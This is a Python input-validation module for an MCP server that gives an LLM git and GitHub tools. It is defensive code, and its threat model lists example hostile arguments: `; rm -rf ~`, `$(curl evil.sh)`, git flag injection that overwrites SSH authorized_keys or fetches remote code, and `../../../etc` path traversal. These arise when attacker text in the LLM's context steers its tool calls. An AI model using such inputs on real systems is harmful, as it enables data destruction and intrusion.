"""
BEST PRACTICE #1 -- INPUT SANITIZATION.

Threat model for this server
---------------------------
Every argument reaching these tools was produced by an LLM, and the LLM's
context can contain attacker-controlled text (a GitHub issue body, a README, a
pasted log). So tool arguments are UNTRUSTED INPUT, exactly like an HTTP form
field. Two concrete attacks are in scope:

  1. COMMAND INJECTION -- an argument such as `; rm -rf ~` or `$(curl evil.sh)`
     reaching a shell.
     Defence in depth:
       (a) `git_ops.run_git` never uses a shell: it passes an argv *list* to
           `subprocess.run(..., shell=False)`, so metacharacters are literal.
       (b) These validators reject metacharacters anyway, so a future edit that
           reintroduces a shell does not become an instant RCE.

  2. ARGUMENT INJECTION -- a value that is not a shell attack but is swallowed
     by git as a *flag*, e.g. author="--output=/home/me/.ssh/authorized_keys"
     or author="--upload-pack=curl evil.sh". `shell=False` does NOT stop this,
     which is why `reject_option_like()` exists and why every user value is
     passed as `--author=<value>` (one token) rather than `--author <value>`.

  3. PATH TRAVERSAL -- repo_path="../../../etc". `resolve_repo_path()` resolves
     symlinks and `..` first, then checks containment inside WORKSPACE_ROOT.

Style: validators raise `ValidationError` with a message that describes the
RULE that was broken, never the internal state of the machine.
"""

from __future__ import annotations

import re
import unicodedata
from pathlib import Path

from .errors import ValidationError

# Characters that a POSIX or Windows shell would interpret. We reject rather
# than escape: escaping is easy to get subtly wrong, rejecting is not.
SHELL_METACHARACTERS = set(";&|`$><()\n\r\\!*?[]{}'\"")

# A GitHub "owner/repo" slug. GitHub owners: alphanumeric + single hyphens,
# max 39 chars. Repo names: alphanumeric, '.', '_', '-', max 100 chars.
REPO_SLUG_RE = re.compile(
    r"^[A-Za-z0-9](?:[A-Za-z0-9]|-(?=[A-Za-z0-9])){0,38}/[A-Za-z0-9._-]{1,100}$"
)

# Author filter: human names, spaces, and e-mail addresses. Deliberately narrow.
AUTHOR_RE = re.compile(r"^[A-Za-z0-9 ._@+-]{1,100}$")

# Git ref (branch/tag). Mirrors the strict subset of `git check-ref-format`.
GIT_REF_RE = re.compile(r"^[A-Za-z0-9._/-]{1,255}$")

MAX_TITLE_CHARS = 256
MAX_BODY_CHARS = 8_000


# --------------------------------------------------------------------------
# Generic building blocks
# --------------------------------------------------------------------------
def reject_option_like(value: str, field: str) -> str:
    """Block ARGUMENT injection: a value that git would read as a flag.

    Without this, `author="--output=/tmp/x"` becomes a git option even though
    no shell is involved.
    """
    if value.startswith("-"):
        raise ValidationError(
            f"{field} may not start with '-': a leading dash would be parsed as a "
            "command-line option rather than a value."
        )
    return value


def reject_shell_metacharacters(value: str, field: str) -> str:
    """Block COMMAND injection characters outright (defence in depth)."""
    bad = sorted(set(value) & SHELL_METACHARACTERS)
    if bad:
        raise ValidationError(
            f"{field} contains characters that are not allowed: {''.join(bad)!r}. "
            "Only letters, digits, spaces and . _ @ + - / are accepted."
        )
    return value


def reject_control_characters(value: str, field: str) -> str:
    """Strip-check for NUL, ESC and friends.

    A NUL byte can truncate a C-level string; ESC sequences can spoof terminal
    output in whatever renders the result.
    """
    for ch in value:
        if ch != "\n" and ch != "\t" and unicodedata.category(ch) == "Cc":
            raise ValidationError(
                f"{field} contains a control character (U+{ord(ch):04X}), "
                "which is not allowed."
            )
    return value


# --------------------------------------------------------------------------
# Field-specific validators
# --------------------------------------------------------------------------
def validate_repo_slug(value: str, allowed: frozenset[str] = frozenset()) -> str:
    """Validate an 'owner/repo' slug and optionally enforce an allow-list."""
    value = (value or "").strip()
    if not value:
        raise ValidationError("repo is required, in the form 'owner/repo'.")
    reject_option_like(value, "repo")
    if not REPO_SLUG_RE.match(value):
        raise ValidationError(
            "repo must look like 'owner/repo' using only letters, digits, "
            "'.', '_' and '-' (for example 'octocat/Hello-World')."
        )
    if allowed and value.lower() not in allowed:
        # Note: we say the repo is not permitted, NOT which repos are permitted.
        raise ValidationError(
            f"repo '{value}' is not in this server's allow-list, so no request "
            "was sent. Ask the operator to add it to ALLOWED_REPOS in .env."
        )
    return value


def validate_author(value: str) -> str:
    """Validate the optional `--author` filter for git log."""
    value = (value or "").strip()
    if not value:
        return ""
    reject_option_like(value, "author")
    reject_control_characters(value, "author")
    reject_shell_metacharacters(value, "author")
    if not AUTHOR_RE.match(value):
        raise ValidationError(
            "author must be 1-100 characters of letters, digits, spaces, or "
            ". _ @ + - (a name or an e-mail address)."
        )
    return value


def validate_git_ref(value: str, *, field: str = "branch") -> str:
    """Validate a branch or tag name."""
    value = (value or "").strip()
    if not value:
        raise ValidationError(f"{field} is required.")
    reject_option_like(value, field)
    reject_control_characters(value, field)
    reject_shell_metacharacters(value, field)
    if ".." in value or value.endswith(".lock") or value.startswith("/"):
        raise ValidationError(
            f"{field} is not a valid git ref name (no '..', no leading '/', "
            "no '.lock' suffix)."
        )
    if not GIT_REF_RE.match(value):
        raise ValidationError(
            f"{field} may only contain letters, digits, and . _ - /"
        )
    return value


def validate_max_count(value: int, *, ceiling: int = 200) -> int:
    """Clamp-or-reject the number of commits requested.

    Bounding this is a cheap denial-of-service control: an LLM asking for
    1_000_000 commits would otherwise blow up the context window and the
    server's memory.
    """
    try:
        count = int(value)
    except (TypeError, ValueError):
        raise ValidationError("max_count must be a whole number.") from None
    if count < 1 or count > ceiling:
        raise ValidationError(f"max_count must be between 1 and {ceiling}.")
    return count


def sanitize_issue_title(value: str) -> str:
    """Single-line, length-capped, control-character-free issue title."""
    value = (value or "").strip()
    if not value:
        raise ValidationError("title is required and may not be blank.")
    reject_control_characters(value, "title")
    value = " ".join(value.split())  # collapse newlines/tabs into single spaces
    if len(value) > MAX_TITLE_CHARS:
        raise ValidationError(
            f"title must be {MAX_TITLE_CHARS} characters or fewer "
            f"(received {len(value)})."
        )
    return value


def sanitize_issue_body(value: str) -> str:
    """Length-capped, control-character-free issue body.

    Markdown is allowed (GitHub renders it), so we do NOT strip punctuation
    here: the body is written to a JSON field by httpx, never to a shell, so
    metacharacters have no meaning. We only bound size and reject control
    characters.
    """
    value = value or ""
    reject_control_characters(value, "body")
    if len(value) > MAX_BODY_CHARS:
        raise ValidationError(
            f"body must be {MAX_BODY_CHARS} characters or fewer "
            f"(received {len(value)})."
        )
    return value


def validate_labels(labels: list[str] | None) -> list[str]:
    """Validate GitHub issue labels (at most 10, simple charset)."""
    if not labels:
        return []
    if len(labels) > 10:
        raise ValidationError("at most 10 labels are allowed.")
    clean: list[str] = []
    for raw in labels:
        label = (raw or "").strip()
        if not label:
            continue
        reject_control_characters(label, "label")
        if len(label) > 50 or not re.match(r"^[A-Za-z0-9 ._:/-]+$", label):
            raise ValidationError(
                "each label must be 1-50 characters of letters, digits, spaces "
                "or . _ : / -"
            )
        clean.append(label)
    return clean


# --------------------------------------------------------------------------
# Filesystem confinement
# --------------------------------------------------------------------------
# Adapted from the containment check used by the reference MCP filesystem
# server, https://github.com/modelcontextprotocol/servers (src/filesystem),
# which resolves the requested path first and then verifies that the resolved
# path is inside an allowed directory. Re-implemented here in Python with
# pathlib; the original is TypeScript.
def resolve_repo_path(raw_path: str, workspace_root: Path) -> Path:
    """Resolve `raw_path` and guarantee it stays inside `workspace_root`.

    Why resolve BEFORE checking: `"~/mcp-workspace/../../etc"` only reveals
    itself as an escape after `.resolve()` collapses the `..` segments and
    follows symlinks.
    """
    raw_path = (raw_path or "").strip()
    if not raw_path:
        raise ValidationError("repo_path is required.")
    reject_option_like(raw_path, "repo_path")
    reject_control_characters(raw_path, "repo_path")

    root = workspace_root.expanduser().resolve()
    candidate = Path(raw_path).expanduser()
    if not candidate.is_absolute():
        candidate = root / candidate
    resolved = candidate.resolve()

    # Path.is_relative_to() is Python >= 3.9.
    if resolved != root and not resolved.is_relative_to(root):
        # Message names the rule and the allowed root (which the user already
        # configured themselves) but never the resolved path, so probing the
        # filesystem through error messages gains the caller nothing.
        raise ValidationError(
            "repo_path is outside this server's workspace and was refused. "
            f"Only paths inside '{root}' may be accessed."
        )
    if not resolved.exists():
        raise ValidationError("repo_path does not exist inside the workspace.")
    if not resolved.is_dir():
        raise ValidationError("repo_path must be a directory.")
    if not (resolved / ".git").exists():
        raise ValidationError(
            "repo_path is not a git repository (no .git directory found)."
        )
    return resolved
